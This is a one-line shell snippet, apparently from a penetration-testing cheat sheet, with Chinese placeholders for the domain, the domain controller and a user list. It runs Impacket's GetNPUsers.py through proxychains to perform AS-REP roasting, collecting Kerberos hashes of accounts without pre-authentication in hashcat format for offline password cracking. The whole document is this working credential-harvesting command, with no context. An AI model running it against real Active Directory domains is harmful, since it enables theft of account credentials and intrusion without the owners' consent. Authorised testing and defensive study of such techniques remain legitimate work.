
```shell
proxychains4 -q python3 GetNPUsers.py <域名称> -dc-ip <域控主机地址> -usersfile <待测试域用户>.txt -format hashcat -outputfile hashes.txt
```